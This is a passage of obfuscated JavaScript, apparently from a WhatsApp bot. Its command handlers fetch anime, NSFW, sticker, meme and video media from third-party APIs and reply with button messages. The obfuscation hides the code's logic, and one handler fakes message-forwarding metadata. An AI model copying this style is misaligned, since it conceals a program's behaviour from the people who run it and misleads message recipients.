_0x4436c1={};_0x4436c1[_0x1e23e4(-0x269,0x71,0x1de,0x1c7)+'t']=_0x593f96(0x37b,0x3b9,0x27c,-0xa8);const _0x58cb80={};_0x58cb80[_0x1e23e4(-0x1b2,0x2ae,0x200,-0x218)]=_0x593f96(0x457,-0x4a,0x7b8,0xaa),_0x58cb80[_0x593f96(0x2a4,0x34d,0x771,-0x238)]=_0x4436c1,_0x58cb80[_0x1e23e4(0x8bb,0x4af,0x9a0,0x96d)]=0x1;const _0x3f1e53={};_0x3f1e53[_0x593f96(0x3bc,0x221,0x88a,0x442)+'t']='Sewa\x20☕';const _0x4975de={};_0x4975de[_0x593f96(0x3de,-0x80,0x57f,0x68d)]='sewa_kak',_0x4975de['buttonText']=_0x3f1e53,_0x4975de[_0x1e23e4(0x8df,0x616,0x9a0,0xbd9)]=0x1;const buttonsx_=[_0x58cb80,_0x4975de],btnx_={'contentText':lang[_0x1e23e4(0x34d,0x39c,0x435,0x30a)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+('\x20|\x20Request'+_0x1e23e4(0x7bf,-0x10,0x322,0x6a3))+sender[_0x1e23e4(0x51b,0x148,0x133,0x352)]('@')[0x3f5+0xbd7*-0x3+-0x10*-0x1f9],'buttons':buttonsx_,'headerType':0x5,'videoMessage':bacotlux_[_0x593f96(0xb85,0xa0c,0xd68,0xe83)][_0x593f96(0xba1,0xf3e,0xd84,0x96f)+'ge']},_0x3153ff={};_0x3153ff[_0x593f96(0x2ad,0x3e3,0x715,-0xeb)+'id']=[sender];const _0x4092c2={};_0x4092c2['quoted']=mek,_0x4092c2[_0x1e23e4(0xc63,0x90e,0x8c6,0xb5f)+'o']=_0x3153ff,alpha['sendMessag'+'e'](from,btnx_,MessageType[_0x593f96(0x4e9,0x747,0x283,0x221)+'sage'],_0x4092c2)[_0x1e23e4(0x93e,0xd64,0xaae,0xf33)](_0x4ed454=>{function _0xfa56ba(_0x2a3146,_0x336f66,_0x52779e,_0x143cb6){return _0x1e23e4(_0x2a3146-0xba,_0x336f66-0xaf,_0x2a3146- -0x2d3,_0x336f66);}function _0x2f2780(_0x327c87,_0xa4941b,_0x390d3c,_0x4edfdc){return _0x1e23e4(_0x327c87-0x1ec,_0xa4941b-0x81,_0xa4941b- -0x3ed,_0x327c87);}reply(_0xfa56ba(0x2b2,-0x2d,0x2ce,0x796)+_0xfa56ba(0x63,-0x282,0x69,-0x411)+_0x2f2780(-0x7a,-0x213,-0x716,-0xf4)+_0x2f2780(0xa9a,0x5c3,0x96d,0x2b7)+'gi');});break;case'feet':case _0x1e23e4(0x44d,0x824,0x364,0x437):case _0x1e23e4(0x3b1,0xa5f,0x5fa,0xad4):case _0x1e23e4(0x6d0,0xaec,0xa9b,0x590):case _0x593f96(0x6f6,0x697,0x891,0xa93):case _0x1e23e4(0x54a,0xb7a,0x711,0x6cf):case _0x1e23e4(-0x7a,0x65e,0x164,0x522):case'avatar':case _0x1e23e4(0xa64,0x57d,0xa02,0x71b):case _0x1e23e4(0x1cd,-0x199,0x102,-0x3ae):case _0x593f96(0xc11,0xe56,0xcd7,0xf42):case _0x1e23e4(0x93e,0x66a,0x882,0xd74):case'fox_girl':case _0x1e23e4(0x35,0x612,0x460,0x198):case'eroyuri':case _0x593f96(0xb05,0xe84,0xf5d,0x7f2):case _0x593f96(0x7db,0x564,0x736,0x406):case'yuri':case _0x593f96(0x31a,0x421,0x1bd,-0x9e):case _0x1e23e4(0xa5e,0x9c,0x593,0x7da):case _0x593f96(0x33c,0xb8,0x3db,0xbe):case _0x593f96(0x569,0x4e3,0x149,0x115):case'erok':case _0x1e23e4(-0x74,0x434,0x284,0x2cc):case _0x1e23e4(0x350,0x9f3,0x724,0x669):case _0x593f96(0x332,0x2da,0x1ef,-0x13d)+'r':case'erofeet':case _0x593f96(0x5a8,0x183,0x99b,0x817):case _0x593f96(0x2ce,-0xac,0x4ff,0x26f):case _0x593f96(0x44e,0x57b,0x554,0x485):case'waifu':case _0x593f96(0x303,0x379,-0x1e5,0x3d1):case _0x593f96(0x972,0x6d4,0xa36,0xaae):case _0x1e23e4(0xac,0x3b1,0x59e,0x74f):case _0x593f96(0x7ee,0x8a2,0x920,0x6a8):case _0x593f96(0xbb7,0xbb4,0xb5c,0xa2a):case _0x1e23e4(0x7,0x120,0x363,0x5a5):if(!isNsfw&&!mek[_0x593f96(0x51d,0x234,0x439,0x96)][_0x593f96(0xac4,0xbf1,0xfb5,0x995)]&&!isOwner&&!isCreator)return reply(lang[_0x1e23e4(0xa5,0xef,0x2e4,0x118)]());var ini_img=await fetchJson(_0x1e23e4(0x748,0xecd,0x9d2,0x50d)+'kos.life/a'+_0x593f96(0xc3e,0xf64,0xdfc,0x95e)+command),ini_img_=await getBuffer(ini_img['url']);const mediax=await alpha[_0x1e23e4(0xa20,0x8da,0x781,0x8db)+_0x1e23e4(0x6f6,0x6b8,0xa7d,0x6c8)](from,ini_img_,MessageType['image'],{'thumbnail':Buffer['alloc'](0x1f42+0x5*0x295+0xeb9*-0x3)});let bacotlux=mediax[_0x593f96(0xb85,0xf08,0xa00,0xfc9)][_0x593f96(0xbdf,0x947,0x98f,0x1062)+_0x1e23e4(0xe23,0x737,0x941,0xe3b)]?mediax[_0x1e23e4(0x62c,0x933,0x9a7,0xdf2)][_0x593f96(0xbdf,0xfc2,0xf23,0xb35)+_0x593f96(0xb1f,0x8c4,0xfec,0xf61)]:mediax;const _0xc45ae9={};_0xc45ae9[_0x1e23e4(0x4db,-0x265,0x1de,0x505)+'t']=_0x1e23e4(0xf6,-0x2bc,0x19d,0x469);const _0x21e365={};_0x21e365['buttonId']=_0x593f96(0x457,0x850,0x366,0x606),_0x21e365[_0x1e23e4(0x11a,0x3e8,0xc6,0x59d)]=_0xc45ae9,_0x21e365[_0x1e23e4(0xbdc,0x81f,0x9a0,0x4d2)]=0x1;const _0x4c793a={};_0x4c793a['displayTex'+'t']=_0x1e23e4(0x10e,0x314,0x136,-0x337);const _0x9f1a41={};_0x9f1a41[_0x1e23e4(-0xe6,-0x311,0x200,0x2b5)]=''+command,_0x9f1a41[_0x593f96(0x2a4,0x93,0x144,0x5c0)]=_0x4c793a,_0x9f1a41[_0x593f96(0xb7e,0xc37,0xdfc,0xb74)]=0x1;const buttonsx=[_0x21e365,_0x9f1a41],btnx__={'contentText':lang[_0x593f96(0x613,0x308,0xacb,0x65c)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x1e23e4(0x705,0x9cc,0x7cb,0x810)+_0x593f96(0x500,0x451,0x3a5,0x6e0))+sender[_0x593f96(0x311,0x3dd,0x454,0x392)]('@')[0xa*0x97+0x1e8d+-0x1*0x2473],'buttons':buttonsx,'headerType':0x4,'imageMessage':bacotlux['message']['imageMessa'+'ge']},_0x1c1897={};_0x1c1897[_0x1e23e4(0x20c,-0x3b5,0xcf,-0x7e)+'id']=[sender];const _0x3b3aab={};_0x3b3aab[_0x593f96(0x991,0x65f,0xd62,0xe6f)]=mek,_0x3b3aab[_0x593f96(0xaa4,0xa7a,0xf6b,0x979)+'o']=_0x1c1897,alpha[_0x1e23e4(0x23a,0x7f5,0x685,0x81b)+'e'](from,btnx__,MessageType[_0x1e23e4(0x85,0x57b,0x30b,0x35d)+_0x1e23e4(0x8ad,0xd81,0xa7d,0xd31)],_0x3b3aab)[_0x1e23e4(0xfc3,0x66d,0xaae,0x869)](_0x22b434=>{const _0x57686f={'aRKRM':function(_0x563357,_0x5942d7){return _0x563357(_0x5942d7);},'OVylk':_0x12175e(0x2d5,-0x28c,0x4f9,0x242)+_0x12175e(0xe1,-0x4b4,-0x17,-0xd)+'oba\x20bebera'+_0xc377b7(0x6db,0x946,0xa0b,0xd58)+'gi'};function _0xc377b7(_0x5afebf,_0x591850,_0x1adbb1,_0x2956a0){return _0x593f96(_0x591850- -0x248,_0x2956a0,_0x1adbb1-0x1a8,_0x2956a0-0x181);}function _0x12175e(_0x4e7af1,_0x3cc5ae,_0x4f9c46,_0x2012ea){return _0x593f96(_0x2012ea- -0x521,_0x3cc5ae,_0x4f9c46-0x10c,_0x2012ea-0x4b);}_0x57686f[_0xc377b7(-0x423,0x6f,-0x3e7,-0x1)](reply,_0x57686f[_0xc377b7(0x1d7,0xd1,0x8,-0x335)]);}),await limitAdd(sender,limit);break;case _0x593f96(0x4a0,-0x2,0x9a7,0x4a9):const pref='Usage:\x20'+enter+(_0x1e23e4(0xbe6,0xae5,0x6d4,0x51b)+_0x1e23e4(0x57,0x7ba,0x4b3,0x5f2)+_0x593f96(0xad4,0x760,0x865,0xb20)+_0x1e23e4(0x3d5,0x771,0x878,0x3ca)+_0x1e23e4(0x888,0x83a,0x91c,0xd96)+'\x20false\x20\x0aco'+_0x1e23e4(-0x281,-0x253,0xfc,-0x3d7)+_0x1e23e4(0x77b,0x941,0x5f7,0x357)+_0x1e23e4(-0x3be,0x54c,0x113,0x60c)+_0x593f96(0x730,0x3c2,0x4f8,0x2f9)+'me|orange|'+'pink|purpl'+_0x1e23e4(0x52e,0x5f6,0x88a,0x3a5)+'e|yellow\x20')+enter+enter+_0x593f96(0xba2,0x6c5,0x703,0xd87)+enter+'\x20'+prefix+(_0x1e23e4(0x37a,-0xf,0x1e2,0x550)+'ontoh|true'+'|cyan');if(args[_0x593f96(0xae8,0xfcf,0xa95,0xf4b)]<-0x3a3*0x1+0x68+0x33c)return reply(pref);var kntl_=args[_0x1e23e4(0xd48,0x70e,0xa51,0xf54)]('\x20'),nama_=kntl_[_0x1e23e4(0x27a,0x405,0x133,0x90)]('|')[-0x3df*0x5+0x37f*0x3+0x8de],impostor_=kntl_['split']('|')[-0x69*-0xf+0xbc3*0x3+-0x296f],color_=kntl_['split']('|')[-0x359*0x7+0x9d0+-0xda1*-0x1];const _0x3bc21e={};_0x3bc21e['method']='get';var amongus=await getBuffer(_0x1e23e4(0x4c3,-0x152,0x346,0xd4)+'cefron.nl/'+'api/ejecte'+_0x593f96(0x33e,0x3d8,0x6a5,0x124)+nama_+_0x593f96(0xaa9,0x6d3,0xa4d,0xa1f)+impostor_+_0x593f96(0x98b,0xa8f,0x6ca,0x75c)+color_,_0x3bc21e);amongusp=''+lang['success']()+enter+enter+('Please\x20Sub'+_0x593f96(0x6d8,0x3ad,0x2f0,0x84c)+'ps://youtu'+_0x593f96(0x5c6,0x64c,0x965,0x2f8)+_0x1e23e4(0xc02,0x626,0x856,0xa51)),alpha[_0x1e23e4(0x5af,0x7d6,0x685,0x88e)+'e'](from,amongus,image,{'thumbnail':Buffer['alloc'](-0xcd+0x1*0xed5+-0x382*0x4),'caption':lang[_0x1e23e4(0x5d9,0x2b,0x435,0x108)](),'quoted':mek}),await limitAdd(sender,limit);break;case'tweettrump':case'trump':case _0x593f96(0x778,0x358,0xbaf,0xb02):let trump=args[_0x593f96(0xc2f,0xb8d,0xb4c,0xd3d)]('\x20');const _0x1695da={};_0x1695da[_0x593f96(0x828,0x96f,0x34e,0x736)]='get';let trump1=await fetchJson(_0x593f96(0xbb0,0x8dc,0x930,0xc75)+_0x1e23e4(0x917,0xb37,0x8d3,0x9fd)+_0x593f96(0xb6c,0xa5d,0xb72,0xea4)+_0x593f96(0x86a,0xbf1,0xc80,0x57e)+_0x593f96(0x368,0x64d,0x4c0,0x1b8)+_0x593f96(0xb91,0x6f8,0x70d,0xd16)+trump+'&raw=7',_0x1695da),trump2=await getBuffer(trump1['message']);alpha[_0x1e23e4(0x451,0x40c,0x685,0x394)+'e'](from,trump2,image,{'thumbnail':Buffer['alloc'](0x13d6+-0x1ee7+0xb11),'caption':lang[_0x1e23e4(0x12d,0x942,0x435,0x745)](),'quoted':mek}),await limitAdd(sender,limit);break;case _0x1e23e4(0x8b6,0x91e,0x5fb,0x4fb):let cmm=args[_0x1e23e4(0xc2f,0xe7b,0xa51,0xaad)]('\x20');const _0x19a417={};_0x19a417[_0x1e23e4(0x7a8,0x678,0x64a,0x728)]=_0x593f96(0x57f,0x911,0x111,0x9ea);let anuuu=await fetchJson(_0x593f96(0xbb0,0x8a9,0xf85,0xa57)+_0x593f96(0xab1,0xf8d,0x6ae,0xe78)+_0x593f96(0xb6c,0xa3f,0xff8,0x917)+'en?type=ch'+'angemymind'+'&text='+cmm+_0x1e23e4(0x28a,0x482,0x39d,-0xc4),_0x19a417),bbuffer=await getBuffer(anuuu['message']);alpha[_0x593f96(0x863,0xa3c,0xb66,0xbe0)+'e'](from,bbuffer,image,{'thumbnail':Buffer[_0x1e23e4(0x495,0xbde,0x938,0x484)](0xbde+0x12*-0x94+-0x176),'caption':lang['success'](),'quoted':mek}),await limitAdd(sender,limit);break;case _0x1e23e4(0x30f,-0x28,0x1b6,-0xe0):let kanna=args[_0x1e23e4(0xc02,0x7c5,0xa51,0xd06)]('\x20');const _0x3eeef1={};_0x3eeef1[_0x593f96(0x828,0x60e,0x563,0xd07)]=_0x593f96(0x57f,0x690,0x5eb,0x7bb);var anu_=await fetchJson(_0x593f96(0xbb0,0xa4d,0xefc,0x813)+_0x1e23e4(0x749,0x6ed,0x8d3,0x861)+_0x593f96(0xb6c,0x9a8,0x1032,0x873)+'en?type=ka'+_0x593f96(0xa67,0xbfa,0xc26,0xab3)+'t='+kanna+_0x593f96(0x57b,0x2df,0x66e,0x234),_0x3eeef1);let buffer_h=await getBuffer(anu_[_0x1e23e4(0x5f4,0x72d,0x9a7,0xd0c)]);alpha[_0x593f96(0x863,0xc9e,0x3d9,0x782)+'e'](from,buffer_h,image,{'thumbnail':Buffer[_0x1e23e4(0x5f5,0xb69,0x938,0x4d5)](-0x2*-0xb4e+-0x1*-0x61d+-0x1cb9),'caption':lang['success'](),'quoted':mek}),await limitAdd(sender,limit);break;case _0x593f96(0x36c,0x5fa,0x86f,0x556):case _0x593f96(0x4a8,0x518,0x72e,0x199):case _0x593f96(0x412,0xfc,0x40,0x750):case _0x1e23e4(0x20a,0x5ce,0xeb,-0x24b):case _0x593f96(0x6ab,0x731,0xa58,0x412)+'g':case _0x1e23e4(0x982,0x5e8,0x9ae,0xd39):case _0x593f96(0xcd0,0x9d8,0x11df,0xc63):case _0x593f96(0xba5,0x79b,0x6bc,0x7cc):case _0x593f96(0x48d,0x4b9,0x35a,0x63):case _0x1e23e4(0x4f7,0x7f2,0x8eb,0x6d6):case'kucing':case _0x1e23e4(0x681,0x4bd,0x6c0,0x97a):case'manusia_li'+'di':case'menjamet':case'meow':case _0x593f96(0x687,0x348,0x387,0x716):case'patrick':case _0x593f96(0xbeb,0x9a0,0x7f5,0x7a7):case _0x593f96(0x3e3,0x17a,-0xf8,0x181):case _0x1e23e4(0x97,-0xfa,0x1d2,0x666)+_0x1e23e4(0x6f6,0x671,0x755,0x7a6):case'tyni':reply(lang[_0x593f96(0x321,0x409,0x7a,-0xb)]());var telestc=await fetchJson(_0x1e23e4(0x6f0,0x3b7,0x7fa,0xb43)+_0x593f96(0xa40,0xd57,0xb2a,0x734)+'.herokuapp'+'.com/api/t'+_0x593f96(0x3c8,0x68a,0x3a4,0x271)+_0x1e23e4(0x167,0x1c7,0x2a7,0x6ad)+command+(_0x1e23e4(0x1ce,0x996,0x6b2,0x774)+'fline'));let random_telestc=await getBuffer(telestc[_0x1e23e4(0xd8e,0x713,0x987,0x98c)]);const _0x5aec01={};_0x5aec01[_0x1e23e4(0x302,0x5ad,0x7b3,0xb88)]=fgclink,await alpha[_0x593f96(0x863,0x3fb,0x385,0x4b8)+'e'](from,random_telestc,sticker,_0x5aec01);var ini_gopaiyy=_0x1e23e4(-0x2a1,-0xff,0xdb,-0x3b8)+pushname;const _0x117b2e={};_0x117b2e['displayTex'+'t']=_0x1e23e4(0x81d,0x387,0x452,0x105);const _0xe543b9={};_0xe543b9[_0x1e23e4(0x6c3,-0x260,0x200,0x1fd)]=_0x593f96(0xaba,0xa65,0xf76,0x59f),_0xe543b9[_0x1e23e4(-0x425,0x187,0xc6,0x24)]=_0x117b2e,_0xe543b9[_0x1e23e4(0xb20,0xb49,0x9a0,0x4d7)]=0x1;const _0x15fac3={};_0x15fac3[_0x1e23e4(0x600,0x6e1,0x1de,0x414)+'t']=_0x593f96(0x314,0x2d9,0x689,-0xd3);const _0x20dddb={};_0x20dddb['buttonId']=''+command,_0x20dddb['buttonText']=_0x15fac3,_0x20dddb[_0x593f96(0xb7e,0xba2,0xf05,0xeba)]=0x1;var buttonoss=[_0xe543b9,_0x20dddb];const _0x1df7f2={};_0x1df7f2[_0x593f96(0x4b5,0x1cd,0x6ce,0x3c4)+'t']=ini_gopaiyy,_0x1df7f2['footerText']=_0x1e23e4(0x71f,0x4d2,0x661,0x1bd)+'for\x20new\x20st'+_0x593f96(0x4af,0x17f,0x398,0x986),_0x1df7f2[_0x593f96(0xacd,0x66b,0xf5a,0xda8)]=buttonoss,_0x1df7f2[_0x1e23e4(0x3de,0x410,0x79a,0x907)]=0x1,buttonMessagepe=_0x1df7f2;const _0x28c433={};_0x28c433[_0x1e23e4(0xaef,0x8e6,0xa6a,0x566)]='hi',_0x28c433[_0x593f96(0xa0e,0xcfa,0x768,0xf1d)+'Score']=0x3b9aca00,_0x28c433['isForwarde'+'d']=!![],_0x28c433[_0x1e23e4(-0x264,0x1a8,0x142,0x63d)+_0x593f96(0x3c2,0x1f8,0x53f,0x8b9)]=!![],_0x28c433[_0x1e23e4(0x110,0x299,0xcf,0x43b)+'id']=[sender];const _0x40689f={};_0x40689f['caption']='Botwea\x20©2k'+'21',_0x40689f[_0x593f96(0xaa4,0x727,0x8a9,0xb43)+'o']=_0x28c433,_0x40689f[_0x593f96(0x991,0xb10,0xa49,0xe6e)]=mek,_0x40689f[_0x593f96(0x320,0x5c9,0x581,0x35d)+_0x593f96(0x3c2,0x118,0x4d7,0x6)]=!![],alpha[_0x1e23e4(0x30d,0x51b,0x685,0x1ea)+'e'](from,buttonMessagepe,MessageType[_0x593f96(0x4e9,0x5d5,0x720,0x56b)+_0x593f96(0xc5b,0xc30,0x7bb,0x762)],_0x40689f),await limitAdd(sender,limit);break;case _0x1e23e4(0x7f7,0x545,0x93f,0xabd):case _0x593f96(0xb10,0x732,0xd28,0x9ea):case _0x593f96(0x614,0x5c2,0x304,0x2f4):case _0x593f96(0x52f,0x75c,0x4e3,0x692):case _0x593f96(0x469,0x866,-0x91,0x207):case'nisa':case _0x593f96(0x8c6,0xdc2,0x9a5,0x54f):case _0x593f96(0x6f0,0xb8f,0x3ac,0x481):case'viona':case _0x1e23e4(0xd13,0x9ee,0x860,0x59c):case _0x1e23e4(0x929,0x96a,0x5cb,0x313):case _0x593f96(0xa83,0xc00,0x700,0xbcb):case _0x1e23e4(0x4a,-0x7a,0x3e9,0x111):case _0x593f96(0x876,0xa8d,0x8fe,0x97f):case _0x593f96(0x7be,0x7b3,0x4af,0x6bf):case _0x1e23e4(0x3ca,0x3a2,0x68e,0x501)+'ni':case'asupan':case'bocil':case'geayubi':case'santuy':case _0x593f96(0x5d9,0x682,0x303,0xa4a):reply(lang[_0x593f96(0x321,-0x153,0x4a3,0x647)]());var random_asupan=await getBuffer('https://ap'+_0x1e23e4(0x3b0,0x59e,0x862,0xc46)+'.herokuapp'+_0x1e23e4(0xb2b,0xa6b,0x90d,0xda0)+_0x1e23e4(-0x7,0x7b5,0x46e,0x859)+command+('?apikey=of'+_0x593f96(0xbd0,0xbbb,0xdfd,0xc39)));const mediaxx=await alpha['prepareMes'+'sage'](from,random_asupan,MessageType[_0x593f96(0x605,0x31a,0x5df,0x55b)],{'thumbnail':Buffer[_0x1e23e4(0x737,0x75b,0x938,0x9de)](0x20ab*0x1+0x246d+-0x1146*0x4)});let bacotluxx=mediaxx[_0x593f96(0xb85,0xfe4,0xab9,0xfa9)][_0x593f96(0xbdf,0x105d,0xb50,0xcd0)+_0x1e23e4(0xe29,0x5bf,0x941,0xdbd)]?mediaxx[_0x593f96(0xb85,0x901,0xa11,0x91c)]['ephemeralM'+_0x1e23e4(0xc15,0xc68,0x941,0xdb9)]:mediaxx;const _0x5c7b43={};_0x5c7b43['displayTex'+'t']=_0x593f96(0x37b,0x84a,0x224,0x457);const _0x457fd3={};_0x457fd3[_0x1e23e4(0x54,-0x215,0x200,0x660)]=_0x1e23e4(0x4e9,0x3e7,0x279,0x137),_0x457fd3[_0x1e23e4(0x41,-0x6d,0xc6,0x7a)]=_0x5c7b43,_0x457fd3[_0x1e23e4(0x657,0x9f9,0x9a0,0x511)]=0x1;const _0x2b94c6={};_0x2b94c6['displayTex'+'t']=_0x1e23e4(0x642,0x33e,0x136,-0x289);const _0x597b0e={};_0x597b0e['buttonId']=''+command,_0x597b0e[_0x593f96(0x2a4,-0xa2,-0xd5,0x215)]=_0x2b94c6,_0x597b0e[_0x593f96(0xb7e,0xe67,0xf3d,0x899)]=0x1;const buttonsxx=[_0x457fd3,_0x597b0e],btnx___={'contentText':lang[_0x1e23e4(0x421,0x37f,0x435,0xf9)](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x593f96(0x9a9,0x7b7,0x710,0xbe6)+_0x1e23e4(0x1d9,0x3d7,0x322,-0x1f6))+sender[_0x593f96(0x311,0xcb,0x390,0x5c3)]('@')[-0x1e8*-0x5+0x14b*-0x2+0x379*-0x2],'buttons':buttonsxx,'headerType':0x5,'videoMessage':bacotluxx[_0x593f96(0xb85,0xe8d,0x8b0,0xc39)][_0x1e23e4(0x718,0xd73,0x9c3,0xcef)+'ge']},_0x4ddbe4={};_0x4ddbe4[_0x593f96(0x2ad,0x1b8,0x26d,0x490)+'id']=[sender];const _0x2edd37={};_0x2edd37[_0x593f96(0x991,0xac7,0xd75,0xcd3)]=mek,_0x2edd37['contextInf'+'o']=_0x4ddbe4,alpha[_0x593f96(0x863,0x921,0xa37,0x6f1)+'e'](from,btnx___,MessageType['buttonsMes'+'sage'],_0x2edd37)[_0x593f96(0xc8c,0xf64,0x884,0x7ca)](_0x54c633=>{function _0x5133c6(_0x591904,_0x470709,_0x549ea8,_0x3ae35b){return _0x1e23e4(_0x591904-0x5f,_0x470709-0x187,_0x591904-0x21b,_0x3ae35b);}function _0x3e3c92(_0x2714f4,_0x5ecca3,_0x2b038c,_0xb136ed){return _0x1e23e4(_0x2714f4-0x1e3,_0x5ecca3-0x31,_0x2714f4- -0x312,_0xb136ed);}const _0x30ece1={'TriAI':function(_0x5878a4,_0x3b5231){return _0x5878a4(_0x3b5231);}};_0x30ece1[_0x3e3c92(-0x182,0x26,-0x167,-0x26)](reply,_0x5133c6(0x7a0,0x306,0x3de,0x6d1)+_0x3e3c92(0x24,-0x490,0x52f,0x330)+_0x3e3c92(-0x138,-0x621,-0x3f,-0x2e2)+_0x3e3c92(0x69e,0x8b0,0x189,0x83b)+'gi');}),await limitAdd(sender,limit);break;case _0x1e23e4(0x30d,0x4e5,0x502,0x291):case _0x1e23e4(0x54c,0x24e,0x658,0x85d):case _0x593f96(0x399,0x529,0x3e,-0x14):case'thailand':case _0x1e23e4(0x81c,0xc23,0x97d,0x84f):case _0x593f96(0x738,0x613,0x731,0xb54):case _0x593f96(0xc91,0xaae,0xc60,0xf8f):case'jenni':case _0x1e23e4(0xc25,0xab0,0x72c,0x73d):case _0x593f96(0x9c6,0xac3,0xd00,0x7e1):case _0x593f96(0xc1f,0xdbe,0x10ef,0x112e):reply(lang[_0x1e23e4(-0x3bf,0x44a,0x143,0x2e0)]());var cecan=await fetchJson(_0x593f96(0x9d8,0xeb0,0xb91,0xd10)+'i-alphabot'+_0x1e23e4(0xca2,0x99f,0x8a2,0x539)+'.com/api/c'+_0x593f96(0xc1b,0xae3,0xcad,0xb94)+command+(_0x593f96(0x890,0x8d7,0xd2f,0xb7a)+_0x593f96(0xbd0,0xffe,0xa65,0xcdb)));let random_cecan=await getBuffer(cecan['result']);const mediaxxx=await alpha['prepareMes'+_0x593f96(0xc5b,0xe0d,0xcfe,0x9ec)](from,random_cecan,MessageType[_0x1e23e4(0x199,0x82a,0x33e,0x2aa)],{'thumbnail':Buffer[_0x593f96(0xb16,0x9c7,0x9f3,0x9fa)](0x1ebb+-0xe85+-0x1036)});let bacotluxxx=mediaxxx[_0x593f96(0xb85,0x83f,0xaab,0x845)][_0x1e23e4(0xb04,0xba9,0xa01,0x647)+_0x593f96(0xb1f,0x695,0xa73,0xec1)]?mediaxxx['message'][_0x1e23e4(0x82d,0xb75,0xa01,0xbbe)+_0x593f96(0xb1f,0xe66,0xd3a,0xda8)]:mediaxxx;const _0x28d2d1={};_0x28d2d1['displayTex'+'t']='🐨\x20Owner';const _0x241510={};_0x241510[_0x1e23e4(-0xcd,-0x1f2,0x200,0x4b)]=_0x593f96(0x457,0x5e8,0x22b,0xf8),_0x241510[_0x1e23e4(0x152,-0x6f,0xc6,-0xe2)]=_0x28d2d1,_0x241510[_0x1e23e4(0x75f,0x51f,0x9a0,0x967)]=0x1;const _0x566401={};_0x566401[_0x593f96(0x3bc,0x481,0x3a2,0x70c)+'t']='Next\x20➡️';const _0x53a5a6={};_0x53a5a6[_0x1e23e4(0x501,-0x2d5,0x200,0x387)]=''+command,_0x53a5a6['buttonText']=_0x566401,_0x53a5a6['type']=0x1;const buttonsxxx=[_0x241510,_0x53a5a6],btnxx__={'contentText':lang['success'](),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+('\x20|\x20Request'+'\x20by\x20@')+sender['split']('@')[-0x1c56+0x1ba4+0xb2],'buttons':buttonsxxx,'headerType':0x4,'imageMessage':bacotluxxx[_0x593f96(0xb85,0xda0,0x1087,0xf15)][_0x593f96(0x82c,0x63e,0xa1c,0x874)+'ge']},_0x38ccce={};_0x38ccce[_0x1e23e4(0x132,0x5d2,0xcf,-0x405)+'id']=[sender];const _0x4a26bc={};_0x4a26bc['quoted']=mek,_0x4a26bc[_0x1e23e4(0x9f5,0xdd8,0x8c6,0x725)+'o']=_0x38ccce,alpha[_0x593f96(0x863,0x488,0x8f1,0x45c)+'e'](from,btnxx__,MessageType[_0x593f96(0x4e9,0x146,0x685,0x549)+_0x1e23e4(0x828,0x7dd,0xa7d,0x96e)],_0x4a26bc)[_0x1e23e4(0x851,0x9ff,0xaae,0x8cc)](_0x358230=>{function _0x42a076(_0x260438,_0x395c1d,_0x850b5c,_0x22c5c1){return _0x1e23e4(_0x260438-0x47,_0x395c1d-0xbd,_0x395c1d- -0x34c,_0x850b5c);}function _0x119798(_0x4f57d2,_0x35790e,_0x5ee49a,_0x20fad1){return _0x1e23e4(_0x4f57d2-0x2e,_0x35790e-0x7c,_0x20fad1- -0xc9,_0x4f57d2);}const _0x4289ad={};_0x4289ad[_0x42a076(0x73,0x2ef,0x55a,-0x5e)]=_0x119798(0x3ee,0x524,0x399,0x4bc)+_0x119798(0x42e,0x58b,0x760,0x26d)+_0x42a076(-0x13f,-0x172,0x151,-0xb8)+'pa\x20saat\x20la'+'gi';const _0x223a05=_0x4289ad;reply(_0x223a05['AskLO']);}),await limitAdd(sender,limit);break;case'sc':case _0x1e23e4(0x96e,0xcf4,0x8df,0x7c5):case _0x1e23e4(0x116,-0x67,0x4ad,0x4b0):var sjakolan=await getBuffer(_0x1e23e4(0x119,0x577,0x165,0xf5)+_0x1e23e4(0x24e,0x8e5,0x664,0x972)+_0x1e23e4(0x443,0x35d,0x144,0x530)+_0x593f96(0xa5f,0xdd0,0xd4d,0x6d9)+_0x593f96(0x3ee,-0xae,0x894,-0x7e));const _0x175d37={};_0x175d37['displayTex'+'t']='⋮☰\x20MENU';const _0x21405d={};_0x21405d['buttonId']=_0x593f96(0x312,-0x26,0x92,0x1c3),_0x21405d[_0x593f96(0x2a4,0x5a8,0x422,0x342)]=_0x175d37,_0x21405d[_0x593f96(0xb7e,0xfaf,0xab4,0xcf7)]=0x1;const _0x46edb0={};_0x46edb0[_0x1e23e4(-0xf3,-0x2,0x1de,0x261)+'t']=_0x593f96(0x77d,0x2e8,0xbd8,0xbca);const _0x5d0a86={};_0x5d0a86['buttonId']='owner',_0x5d0a86[_0x1e23e4(-0x3c2,-0x35c,0xc6,0x172)]=_0x46edb0,_0x5d0a86[_0x593f96(0xb7e,0xa35,0x6f2,0x745)]=0x1,sendButLocation(from,'🏅\x20Source\x20S'+_0x593f96(0xa76,0x7f4,0xba1,0xd3f)+_0x593f96(0xa46,0xa03,0x82d,0xe78)+_0x1e23e4(0x763,0x836,0x80d,0x817)+'m/c/zeeone'+'ofc',''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x593f96(0x2b1,0x4cb,-0x1cb,0x78)+ini_mark[_0x1e23e4(0x425,-0x346,0x133,0x4c1)]('@')[-0x1278+0x127*-0x17+0x1*0x2cf9],sjakolan,[_0x21405d,_0x5d0a86],{'contextInfo':{'mentionedJid':[ini_mark]}});break;case _0x1e23e4(-0x1bb,0x27b,0xfd,-0x262):sendKatalog(_0x1e23e4(0xa2b,0xbd5,0x83e,0x57e)+_0x1e23e4(0xb20,0x9fd,0x8d6,0x3bd),'5000000000'+'00','Tes\x20aja\x20om');break;case'play':if(!isGroup)return reply(lang[_0x1e23e4(0x485,0x1f4,0x27f,0x2df)]());if(args[_0x1e23e4(0xd7f,0x5ee,0x90a,0xc1f)]<0x2*-0x12e+0x1*-0x18d+0x1*0x3ea)return reply(_0x1e23e4(0xcf5,0xa9f,0x99a,0x935)+_0x593f96(0xb40,0xf4f,0xb19,0xce5)+prefix+(_0x1e23e4(-0x6,0x41e,0x13e,0x43b)+'*'));reply(lang[_0x593f96(0x321,0x62a,0x20e,0x4c8)]());let yut=await 